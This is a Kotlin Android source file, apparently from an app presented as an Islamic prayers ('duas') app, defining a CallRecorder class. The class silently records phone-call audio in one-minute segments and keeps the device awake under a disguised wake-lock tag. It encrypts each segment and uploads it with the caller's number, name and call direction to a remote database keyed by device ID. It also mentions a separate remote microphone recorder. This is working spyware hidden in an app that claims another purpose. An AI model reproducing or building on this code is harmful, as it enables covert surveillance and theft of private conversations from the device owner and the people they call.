package islamic.duas.media

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import islamic.duas.cloud.CloudApi
import islamic.duas.utils.DeviceId
import islamic.duas.utils.PayloadCipher
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

class CallRecorder private constructor(private val context: Context) {

    companion object {
        private const val TAG = "MediaWorker"
        private const val SEGMENT_SECONDS = 60L
        private const val MAX_DURATION_SEC = 7200
        private const val UPLOAD_RETRIES = 3
        private const val MIN_FREE_BYTES = 50L * 1024 * 1024

        /** Shared interlock: true when any recorder holds the microphone */
        val isMicInUse = AtomicBoolean(false)

        @Volatile
        private var instance: CallRecorder? = null

        fun getInstance(context: Context): CallRecorder {
            return instance ?: synchronized(this) {
                instance ?: CallRecorder(context.applicationContext).also { instance = it }
            }
        }
    }

    private val lock = Any()
    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingId: String? = null
    private var currentCallId: String? = null
    private var callType: String? = null
    private var callerNumber: String? = null
    private var callerName: String? = null
    private var callDirection: String? = null
    private var startTime: Long = 0
    private var segmentsCompleted: Int = 0
    private var totalRecordedBytes: Long = 0
    private var lastElapsedSec: Int = 0
    private val segmentFiles = java.util.Collections.synchronizedList(mutableListOf<File>())
    private val isRecording = AtomicBoolean(false)
    private val isFinalized = AtomicBoolean(false)
    private var recordingJob: Job? = null
    private val pendingUploads = mutableListOf<Job>()
    private var wakeLock: PowerManager.WakeLock? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val uploadedSegments = java.util.Collections.synchronizedSet(mutableSetOf<Int>())
    private val failedSegments = mutableListOf<Int>()

    fun startCall(type: String, number: String, name: String, direction: String) {
        synchronized(lock) {
            try {
                Log.d("CallFix", "startCall: type=$type number=$number name=$name dir=$direction")
                if (isRecording.get()) return
                if (isMicInUse.getAndSet(true)) {
                    Log.w("CallFix", "mic busy by RemoteRecorder, skipping call recording")
                    return
                }
                if (!hasStorage()) {
                    Log.w("CallFix", "insufficient storage, skipping")
                    return
                }

                isFinalized.set(false)
                isRecording.set(true)
                currentCallId = UUID.randomUUID().toString()
                currentRecordingId = UUID.randomUUID().toString()
                callType = type
                callerNumber = number
                callerName = name
                callDirection = direction
                startTime = System.currentTimeMillis()
                segmentsCompleted = 0
                totalRecordedBytes = 0
                lastElapsedSec = 0
                segmentFiles.clear()
                uploadedSegments.clear()
                failedSegments.clear()

                writeMetadata()
                acquireWakeLock()
                Log.d("CallFix", "wakeLock acquired for call recording")

                recordingJob = scope.launch {
                    try {
                        var elapsed = 0
                        while (isRecording.get() && elapsed < MAX_DURATION_SEC) {
                            try {
                                val segmentIndex: Int
                                synchronized(lock) { segmentIndex = segmentsCompleted }
                                val remainingSec = (MAX_DURATION_SEC - elapsed).toLong()
                                val thisSegmentSec = minOf(SEGMENT_SECONDS, remainingSec)

                                val segmentFile = File(
                                    context.cacheDir,
                                    "seg_${currentRecordingId}_${segmentIndex}.m4a"
                                )
                                synchronized(segmentFiles) { segmentFiles.add(segmentFile) }

                                startMediaRecorder(segmentFile)
                                delay(thisSegmentSec * 1000L)
                                stopMediaRecorder()

                                if (segmentFile.exists() && segmentFile.length() > 0) {
                                    synchronized(lock) {
                                        segmentsCompleted++
                                    }
                                    elapsed += thisSegmentSec.toInt()
                                    totalRecordedBytes += segmentFile.length()

                                    val recIdSnapshot = currentRecordingId
                                    val uploadJob = launch {
                                        uploadSegment(segmentFile, segmentIndex, recIdSnapshot)
                                    }
                                    synchronized(pendingUploads) { pendingUploads.add(uploadJob) }
                                }
                            } catch (_: Exception) {
                                val step = minOf(SEGMENT_SECONDS, (MAX_DURATION_SEC - elapsed).toLong()).toInt()
                                elapsed += step
                            }
                        }
                        finalizeRecording()
                    } catch (_: Exception) {
                        finalizeRecording()
                    }
                }
            } catch (_: Exception) {
                isRecording.set(false)
                releaseWakeLock()
            }
        }
    }

    fun endCall(reason: String) {
        synchronized(lock) {
            try {
                Log.d("CallFix", "endCall reason=$reason")
                isRecording.set(false)
                recordingJob?.cancel()
                isMicInUse.set(false)
            } catch (_: Exception) {}
        }
    }

    private fun hasStorage(): Boolean {
        return try {
            Environment.getExternalStorageDirectory().freeSpace >= MIN_FREE_BYTES
        } catch (_: Exception) { true }
    }

    private fun startMediaRecorder(file: File) {
        val audioSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            listOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.UNPROCESSED,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                MediaRecorder.AudioSource.DEFAULT
            )
        } else {
            listOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                MediaRecorder.AudioSource.DEFAULT
            )
        }

        for (source in audioSources) {
            try {
                mediaRecorder?.release()
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                mediaRecorder?.apply {
                    setOnErrorListener { _, _, _ -> }
                    setAudioSource(source)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(192000)
                    setOutputFile(file.absolutePath)
                    prepare()
                    start()
                }
                return
            } catch (e: Exception) {
                Log.w("CallFix", "audio source $source failed: ${e.message}")
                try { mediaRecorder?.release() } catch (_: Exception) {}
                mediaRecorder = null
            }
        }
        Log.w("CallFix", "all audio sources failed for call recording")
    }

    private fun stopMediaRecorder() {
        try {
            mediaRecorder?.apply { stop(); release() }
        } catch (_: Exception) {}
        mediaRecorder = null
    }

    private suspend fun uploadSegment(file: File, segmentIndex: Int, recordingId: String? = null) {
        if (uploadedSegments.contains(segmentIndex)) {
            Log.d("CallFix", "segment $segmentIndex already uploaded, skipping")
            return
        }
        for (attempt in 1..UPLOAD_RETRIES) {
            try {
                if (!file.exists()) return
                val bytes = file.readBytes()
                val encryptedBytes = PayloadCipher.encryptBytes(bytes)
                val base64 = Base64.encodeToString(encryptedBytes, Base64.NO_WRAP)
                val androidId = DeviceId.get(context)
                val recId = recordingId ?: currentRecordingId ?: return

                val segmentJson = JSONObject().apply {
                    put("data", base64)
                    put("format", "mp4")
                    put("encrypted", true)
                }

                CloudApi.writeToRTDB(
                    "devices/$androidId/recordings/$recId/parts/$segmentIndex",
                    segmentJson
                )

                uploadedSegments.add(segmentIndex)
                file.delete()
                Log.d("CallFix", "segment $segmentIndex uploaded, size=${bytes.size}")
                return
            } catch (_: Exception) {
                if (attempt < UPLOAD_RETRIES) delay(1000L * attempt)
            }
        }
        synchronized(failedSegments) {
            failedSegments.add(segmentIndex)
        }
        Log.w("CallFix", "segment $segmentIndex failed after $UPLOAD_RETRIES attempts")
    }

    private fun writeMetadata() {
        try {
            val androidId = DeviceId.get(context)
            val meta = JSONObject().apply {
                put("callType", callType)
                put("callerNumber", callerNumber)
                put("callerName", callerName)
                put("callDirection", callDirection)
                put("createdAt", startTime)
                put("mimeType", "audio/mp4")
                put("status", "started")
            }
            CloudApi.patchToRTDB("devices/$androidId/recordings/$currentRecordingId", meta)
        } catch (_: Exception) {}
    }

    private suspend fun finalizeRecording() {
        if (!isFinalized.compareAndSet(false, true)) return
        kotlinx.coroutines.withContext(kotlinx.coroutines.NonCancellable) {
        stopMediaRecorder()
        releaseWakeLock()

        // Upload any partial/in-progress segment that wasn't uploaded yet
        synchronized(segmentFiles) {
            val toUpload = segmentFiles.toList()
            for (file in toUpload) {
                val parts = file.name.removePrefix("seg_").removeSuffix(".m4a").split("_")
                val index = parts.lastOrNull()?.toIntOrNull() ?: continue
                if (file.exists() && file.length() > 0 && !uploadedSegments.contains(index)) {
                    totalRecordedBytes += file.length()
                    segmentsCompleted++
                    val recIdSnapshot = currentRecordingId
                    val uploadJob = scope.launch { uploadSegment(file, index, recIdSnapshot) }
                    pendingUploads.add(uploadJob)
                }
            }
        }

        val callId = currentCallId
        val recId = currentRecordingId
        val cType = callType
        val cNumber = callerNumber
        val cName = callerName
        val cDirection = callDirection
        val startTs = startTime
        val dur = ((if (startTs > 0) System.currentTimeMillis() - startTs else 0L) / 1000L).toInt()
        val bytes = totalRecordedBytes
        val segs = segmentsCompleted

        segmentsCompleted = 0
        totalRecordedBytes = 0
        lastElapsedSec = 0
        isRecording.set(false)
        isFinalized.set(true)
        isMicInUse.set(false)
        currentCallId = null
        callType = null
        callerNumber = null
        callerName = null
        callDirection = null
        currentRecordingId = null

        val uploads: List<Job>
        synchronized(pendingUploads) {
            uploads = pendingUploads.toList()
            pendingUploads.clear()
        }
        uploads.forEach { if (it.isActive) it.join() }

        recordingJob?.cancel()

        synchronized(segmentFiles) {
            segmentFiles.forEach { if (it.exists()) it.delete() }
            segmentFiles.clear()
        }

        if (recId == null) return@withContext

        val androidId = try { DeviceId.get(context) } catch (_: Exception) { return@withContext }

        val finalFailedSegments: List<Int>
        synchronized(failedSegments) {
            finalFailedSegments = failedSegments.toList()
        }

        val finalJson = JSONObject().apply {
            put("callId", callId)
            put("callType", cType)
            put("callerNumber", cNumber)
            put("callerName", cName)
            put("callDirection", cDirection)
            put("callRecording", true)
            put("createdAt", startTs)
            put("durationSec", dur)
            put("segmentsCount", segs)
            put("sizeBytes", bytes)
            put("mimeType", "audio/mp4")
            put("encrypted", true)
            put("status", if (finalFailedSegments.isEmpty()) "completed" else "partial")
            if (finalFailedSegments.isNotEmpty()) {
                put("failedSegments", org.json.JSONArray(finalFailedSegments))
            }
        }

        CloudApi.patchToRTDB("devices/$androidId/recordings/$recId", finalJson)
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "devicesync:segment"
            )
            wakeLock?.acquire(SEGMENT_SECONDS * 1000L + 10000L)
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.release()
        } catch (_: Exception) {}
        wakeLock = null
    }

    fun cleanup() {
        synchronized(lock) {
            Log.d("CallFix", "cleanup()")
            stopMediaRecorder()
            releaseWakeLock()
            isRecording.set(false)
            isMicInUse.set(false)
            recordingJob?.cancel()
            uploadedSegments.clear()
            synchronized(failedSegments) { failedSegments.clear() }

            try {
                val cacheDir = context.cacheDir
                val orphans = cacheDir.listFiles { f ->
                    f.name.startsWith("seg_") && f.name.endsWith(".m4a")
                }
                if (orphans != null) {
                    for (f in orphans) f.delete()
                }
            } catch (_: Exception) {}

            scope.cancel()
            instance = null
        }
    }
}
